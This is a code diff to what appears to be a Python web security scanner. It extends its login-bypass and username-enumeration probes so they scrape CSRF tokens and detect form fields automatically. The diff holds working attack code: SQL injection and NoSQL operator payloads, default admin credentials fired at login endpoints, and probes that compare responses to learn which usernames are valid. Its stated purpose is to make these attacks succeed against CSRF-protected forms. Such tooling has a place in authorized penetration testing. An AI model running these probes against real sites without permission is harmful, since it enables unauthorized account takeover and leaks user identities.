@@ -801,13 +801,63 @@ _SUCCESS_WORDS = ("logout", "sign out", "dashboard", "welcome", "my account",
 _LOGIN_FAIL_WORDS = ("invalid", "incorrect", "wrong", "failed", "denied", "unauthor")
 
 
-async def _post_login(c, url: str, data: dict, as_json: bool):
-    """One login attempt. Returns a compact response signature."""
+def _attr(tag: str, name: str) -> str:
+    """Extract an HTML attribute value from a single tag, any quote style."""
+    m = (re.search(rf'{name}\s*=\s*"([^"]*)"', tag, re.I)
+         or re.search(rf"{name}\s*=\s*'([^']*)'", tag, re.I)
+         or re.search(rf'{name}\s*=\s*([^\s>]+)', tag, re.I))
+    return m.group(1) if m else ""
+
+
+async def _prep_login(c, url: str, user_field, pass_field):
+    """GET the login page first: store its session/CSRF cookies on the client,
+    pull hidden CSRF tokens, auto-detect the username/password field names and the
+    real form action. Returns (post_url, hidden_fields, user_field, pass_field, note).
+    This is what makes the probe work against CSRF-protected and non-standard forms."""
+    hidden, uf, pf, post_url, note = {}, user_field, pass_field, url, ""
+    try:
+        r = await c.get(url)          # cookies (session/CSRF) now stored on client c
+        html = r.text or ""
+    except Exception:
+        return url, {}, uf or "username", pf or "password", "no-form-fetched"
+    text_fields = []
+    for t in re.findall(r"<input\b[^>]*>", html, re.I):
+        name = _attr(t, "name")
+        if not name:
+            continue
+        typ = (_attr(t, "type") or "text").lower()
+        if typ == "password":
+            pf = pf or name
+        elif typ == "hidden":
+            hidden[name] = _attr(t, "value")
+        elif typ in ("text", "email", "tel", "search", ""):
+            text_fields.append(name)
+    if not uf:
+        for n in text_fields:
+            if re.search(r"user|email|login|uid|uname|account|mail|phone", n, re.I):
+                uf = n
+                break
+        uf = uf or (text_fields[0] if text_fields else None)
+    m = re.search(r"<form\b[^>]*\baction\s*=\s*[\"']?([^\"'>\s]+)", html, re.I)
+    if m and m.group(1) not in ("#", ""):
+        from urllib.parse import urljoin
+        post_url = urljoin(url, m.group(1))
+    csrf = [k for k in hidden if re.search(r"csrf|token|authenticity|nonce|verification", k, re.I)]
+    if not pf:
+        note = "no-password-field (multi-step or JS/SPA login - probe limited)"
+    elif csrf:
+        note = f"csrf-token carried ({', '.join(csrf)})"
+    return post_url, hidden, uf or "username", pf or "password", note
+
+
+async def _post_login(c, url: str, data: dict, as_json: bool, hidden: dict | None = None):
+    """One login attempt. Returns a compact response signature. Hidden form fields
+    (CSRF tokens etc.) are merged into form-encoded posts."""
     try:
         if as_json:
             r = await c.post(url, json=data)
         else:
-            r = await c.post(url, data=data)
+            r = await c.post(url, data={**(hidden or {}), **data})
     except Exception as e:
         return {"error": str(e)[:80]}
     body = (r.text or "")[:8000]
@@ -842,40 +892,49 @@ def _looks_authed(sig: dict, baseline: dict) -> bool:
     return False
 
 
-async def auth_bypass_probe(url: str, user_field: str = "username",
-                            pass_field: str = "password") -> dict:
+async def auth_bypass_probe(url: str, user_field: str = None,
+                            pass_field: str = None) -> dict:
     """Attack the login endpoint directly: SQL/NoSQL auth bypass + default
-    credentials, diffed against an invalid-credential baseline. `url` must be the
-    form/JSON login endpoint. Tries form-encoded and JSON bodies."""
+    credentials, diffed against an invalid-credential baseline. Auto-detects the
+    form fields and carries CSRF tokens/cookies, so it works on CSRF-protected and
+    non-standard login forms. Field names may be given explicitly to override."""
     url = _norm(url)
     findings = []
+    notes = []
     rnd = f"kryxnouser{_time.time_ns() % 100000}"
 
     for as_json in (False, True):
         async with auth_client(timeout=10, follow_redirects=False, verify=False) as c:
-            baseline = await _post_login(c, url, {user_field: rnd, pass_field: rnd}, as_json)
+            if as_json:
+                post_url, hidden, uf, pf = url, {}, user_field or "username", pass_field or "password"
+            else:
+                post_url, hidden, uf, pf, note = await _prep_login(c, url, user_field, pass_field)
+                if note:
+                    notes.append(note)
+            baseline = await _post_login(c, post_url, {uf: rnd, pf: rnd}, as_json, hidden)
             if baseline.get("error") and as_json is False:
                 continue  # try JSON variant
             # SQLi / default-cred payloads (string form)
             attempts = [
-                ("SQLi", {user_field: "' OR '1'='1' -- ", pass_field: "x"}),
-                ("SQLi", {user_field: "admin' -- ", pass_field: "x"}),
-                ("SQLi", {user_field: "admin", pass_field: "' OR '1'='1"}),
-                ("default-cred", {user_field: "admin", pass_field: "admin"}),
-                ("default-cred", {user_field: "admin", pass_field: "password"}),
+                ("SQLi", {uf: "' OR '1'='1' -- ", pf: "x"}),
+                ("SQLi", {uf: "admin' -- ", pf: "x"}),
+                ("SQLi", {uf: "admin", pf: "' OR '1'='1"}),
+                ("default-cred", {uf: "admin", pf: "admin"}),
+                ("default-cred", {uf: "admin", pf: "password"}),
             ]
             if as_json:  # NoSQL operator injection only makes sense in JSON
                 attempts += [
-                    ("NoSQL", {user_field: "admin", pass_field: {"$ne": None}}),
-                    ("NoSQL", {user_field: {"$ne": None}, pass_field: {"$ne": None}}),
-                    ("NoSQL", {user_field: {"$gt": ""}, pass_field: {"$gt": ""}}),
+                    ("NoSQL", {uf: "admin", pf: {"$ne": None}}),
+                    ("NoSQL", {uf: {"$ne": None}, pf: {"$ne": None}}),
+                    ("NoSQL", {uf: {"$gt": ""}, pf: {"$gt": ""}}),
                 ]
             for kind, data in attempts:
-                sig = await _post_login(c, url, data, as_json)
+                sig = await _post_login(c, post_url, data, as_json, hidden)
                 if _looks_authed(sig, baseline):
                     findings.append({
                         "type": kind, "severity": "critical",
                         "body_type": "json" if as_json else "form",
+                        "fields": {"user": uf, "pass": pf}, "endpoint": post_url,
                         "payload": {k: str(v) for k, v in data.items()},
                         "proof": f"{kind} login payload authenticated (status {sig.get('status')}, "
                                  f"session_cookie={sig.get('set_session_cookie')}, "
@@ -885,25 +944,31 @@ async def auth_bypass_probe(url: str, user_field: str = "username",
         if findings:
             break
 
-    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
-            "note": "Auth bypass - SQL/NoSQL login injection + default credentials, diffed vs invalid baseline."}
+    note = "Auth bypass - SQL/NoSQL login injection + default credentials, diffed vs invalid baseline."
+    if notes:
+        note += " [" + "; ".join(dict.fromkeys(notes)) + "]"
+    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings, "note": note}
 
 
-async def user_enum_probe(url: str, user_field: str = "username",
-                          pass_field: str = "password") -> dict:
+async def user_enum_probe(url: str, user_field: str = None,
+                          pass_field: str = None) -> dict:
     """Username enumeration: compare the login/reset response for a likely-EXISTING
     user vs a definitely-nonexistent one. A visible difference (message/status/size)
-    leaks which usernames are valid."""
+    leaks which usernames are valid. Auto-detects fields and carries CSRF tokens."""
     url = _norm(url)
     ghost = f"kryxnouser{_time.time_ns() % 100000}"
     findings = []
     for as_json in (False, True):
         async with auth_client(timeout=10, follow_redirects=False, verify=False) as c:
-            r_ghost = await _post_login(c, url, {user_field: ghost, pass_field: "wrongpass123"}, as_json)
+            if as_json:
+                post_url, hidden, uf, pf = url, {}, user_field or "username", pass_field or "password"
+            else:
+                post_url, hidden, uf, pf, _ = await _prep_login(c, url, user_field, pass_field)
+            r_ghost = await _post_login(c, post_url, {uf: ghost, pf: "wrongpass123"}, as_json, hidden)
             if not r_ghost.get("status"):
                 continue  # network error / no response - try the other body type
             for known in ("admin", "administrator", "test", "root"):
-                r_known = await _post_login(c, url, {user_field: known, pass_field: "wrongpass123"}, as_json)
+                r_known = await _post_login(c, post_url, {uf: known, pf: "wrongpass123"}, as_json, hidden)
                 if not r_known.get("status"):
                     continue
                 # different status, or notably different body length, or different error wording
